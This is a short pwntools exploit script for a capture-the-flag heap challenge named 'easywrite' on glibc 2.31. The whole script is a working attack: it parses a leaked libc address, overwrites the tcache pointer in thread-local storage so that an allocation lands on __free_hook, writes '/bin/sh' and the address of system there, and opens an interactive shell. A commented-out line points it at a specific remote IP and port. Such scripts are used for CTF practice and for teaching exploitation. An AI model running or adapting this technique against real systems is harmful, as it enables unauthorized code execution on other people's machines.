from pwn import *
import time
elf = ELF("./easywrite")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")
context.binary=elf
target=process([elf.path],env={"LD_PRELOAD":libc.path})
#target=remote('124.156.183.246',20000)
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

target.recvuntil("gift:")
libc_base=int(target.recvline().strip("\n")[2:],16)-libc.sym["setbuf"]
libc_free_hook=libc_base+libc.sym["__free_hook"]
libc_tls=libc_base+0x1f3530
libc_system=libc_base+libc.sym["system"]
payload="\x01"*0x40
payload+=p64(libc_free_hook-8)*0x40
sa("message:",payload)
addr=p64(libc_tls)
sa("write?:",addr)
payload="/bin/sh\x00"+p64(libc_system)
sa("message?:",payload)
target.interactive()
